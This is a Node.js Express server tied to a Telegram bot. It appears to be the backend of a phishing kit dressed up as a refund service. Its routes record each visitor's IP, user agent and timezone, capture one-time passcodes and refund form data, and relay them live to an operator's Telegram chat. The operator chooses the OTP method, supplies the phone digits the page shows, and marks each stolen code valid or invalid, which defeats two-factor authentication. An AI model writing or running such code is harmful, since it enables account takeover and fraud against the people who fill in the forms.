// server.js (Node.js + Express)

console.log('⏳ loaded BOT_TOKEN:', JSON.stringify(process.env.BOT_TOKEN));

const express     = require('express');
const session     = require('express-session');
const bodyParser  = require('body-parser');
const path        = require('path');
const TelegramBot = require('node-telegram-bot-api');
const cors        = require('cors');

// --- Configuration ---
const BOT_TOKEN     = process.env.BOT_TOKEN;
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;
const PORT          = process.env.PORT || 3000;

// In‑memory store (swap for Redis/DB in production)
const store = new Map();

// Initialize Express
const app = express();

// Optional CORS
app.use(cors({ origin: '*' }));
app.use(bodyParser.json());
app.use(session({
  secret: 'your-session-secret',
  resave: false,
  saveUninitialized: true
}));

// Health check
app.get('/ping', (req, res) => res.send('pong'));

// Serve index & static files
app.get('/', (req, res) =>
  res.sendFile(path.join(__dirname, 'index.html'))
);
app.use(express.static(path.join(__dirname)));


// --- Telegram bot setup ---
const bot = new TelegramBot(BOT_TOKEN, { polling: true });
function findSessionByChatId(chatId) {
  for (let [sid, sess] of store) {
    if (sess.chatId === chatId) return sid;
  }
  return null;
}


// --- API routes ---

// 0) Bind‑refund
app.post('/bind-refund', (req, res) => {
  const { chatId, ua, tz } = req.body;
  const sess = store.get(req.session.id) || {};
  Object.assign(sess, { chatId, ip: req.ip, userAgent: ua, timezone: tz });
  store.set(req.session.id, sess);

  bot.sendMessage(chatId,
    `🆕 Refund session started\n` +
    `<b>IP:</b> ${sess.ip}\n` +
    `<b>UA:</b> ${ua}\n` +
    `<b>TZ:</b> ${tz}`,
    { parse_mode: 'HTML' }
  );

  res.sendStatus(200);
});

// 1) Bind‑chat (OTP flow)
app.post('/bind-chat', (req, res) => {
  const { chatId, ua, tz } = req.body;
  const sess = { chatId, ready: false, method: null, phoneLast4: null, ip: req.ip, userAgent: ua, timezone: tz };
  store.set(req.session.id, sess);

  bot.sendMessage(chatId,
    `🆕 New session bound\n` +
    `<b>IP:</b> ${sess.ip}\n` +
    `<b>UA:</b> ${ua}\n` +
    `<b>TZ:</b> ${tz}`,
    {
      parse_mode: 'HTML',
      reply_markup: {
        inline_keyboard: [[
          { text: 'OTP via Phone', callback_data: 'startOtp:phone' },
          { text: 'OTP via Email', callback_data: 'startOtp:email' }
        ]]
      }
    }
  );
  res.sendStatus(200);
});

// 2) Poll for OTP readiness
app.get('/otp-status', (req, res) => {
  const sess = store.get(req.session.id) || {};
  res.json({
    ready: sess.ready || false,
    method: sess.method || null,
    phoneLast4: sess.phoneLast4 || null
  });
});

// 3) Receive OTP submission
app.post('/submit-otp', (req, res) => {
  const { otp, ua, tz } = req.body;
  const sess = store.get(req.session.id) || {};
  Object.assign(sess, { submittedOtp: otp, subUA: ua, subTZ: tz });
  delete sess.valid;
  store.set(req.session.id, sess);

  if (sess.chatId) {
    bot.sendMessage(sess.chatId,
      `🔐 OTP Submission\n` +
      `<b>Session:</b> ${req.session.id}\n` +
      `<b>OTP:</b> <code>${otp}</code>\n` +
      `<b>UA:</b> ${ua}\n` +
      `<b>TZ:</b> ${tz}`,
      {
        parse_mode: 'HTML',
        reply_markup: {
          inline_keyboard: [
            [
              { text: '✅ Valid OTP', callback_data: 'verifyOtp:ok' },
              { text: '❌ Invalid OTP', callback_data: 'verifyOtp:fail' }
            ]
          ]
        }
      }
    );
  }
  res.sendStatus(200);
});

// 4) Poll for OTP verification result
app.get('/otp-verify-status', (req, res) => {
  const sess = store.get(req.session.id) || {};
  res.json({ valid: typeof sess.valid === 'boolean' ? sess.valid : null });
});

// 5) Receive refund requests
app.post('/refund', (req, res) => {
  const data = req.body;
  const sess = store.get(req.session.id) || {};
  if (sess.chatId) {
    let msg = `📝 Refund Request\n<b>Session:</b> ${req.session.id}\n`;
    for (let [k,v] of Object.entries(data)) {
      msg += `<b>${k}:</b> ${v}\n`;
    }
    msg += `<b>IP:</b> ${sess.ip}\n`;
    bot.sendMessage(sess.chatId, msg, { parse_mode: 'HTML' });
  }
  res.sendStatus(200);
});


// --- Telegram callback handlers ---

bot.on('callback_query', async query => {
  const [action,param] = query.data.split(':');
  const chatId    = query.message.chat.id;
  const sessionId = findSessionByChatId(chatId);

  if (action === 'startOtp' && sessionId) {
    const sess = store.get(sessionId);
    sess.ready  = true;
    sess.method = param;
    sess.phoneLast4 = null;        // reset
    store.set(sessionId, sess);

    // notify admin
    await bot.answerCallbackQuery(query.id, { text: `OTP via ${param} selected` });
    await bot.sendMessage(chatId, `🔔 OTP form enabled via ${param}.`);

    // if phone, ask for last4
    if (param === 'phone') {
      await bot.sendMessage(chatId,
        `❓ Please reply with the **last 4 digits** of the phone where the OTP will arrive:`,
        { parse_mode: 'Markdown' }
      );
    }

  } else if (action === 'verifyOtp' && sessionId) {
    const sess = store.get(sessionId);
    sess.valid = (param === 'ok');
    store.set(sessionId, sess);
    await bot.answerCallbackQuery(query.id, {
      text: sess.valid ? '✅ Marked valid' : '❌ Marked invalid'
    });
    await bot.sendMessage(chatId,
      sess.valid ? '✅ OTP marked valid.' : '❌ OTP marked invalid.'
    );

  } else {
    await bot.answerCallbackQuery(query.id, { text: 'No active session found.' });
  }
});

// 6) Catch plain‑text replies for phoneLast4
bot.on('message', msg => {
  const chatId = msg.chat.id;
  const sessionId = findSessionByChatId(chatId);
  if (!sessionId) return;

  const sess = store.get(sessionId);

  // only accept 4 digits if we're in phone mode and not yet set
  if (sess.method === 'phone' && !sess.phoneLast4) {
    const text = msg.text.trim();
    if (/^\d{4}$/.test(text)) {
      sess.phoneLast4 = text;
      store.set(sessionId, sess);
      bot.sendMessage(chatId, `📱 Phone ending in ****${text} recorded.`);
    }
  }
});


// Start server
app.listen(PORT, () => console.log(`Server listening on port ${PORT}`));
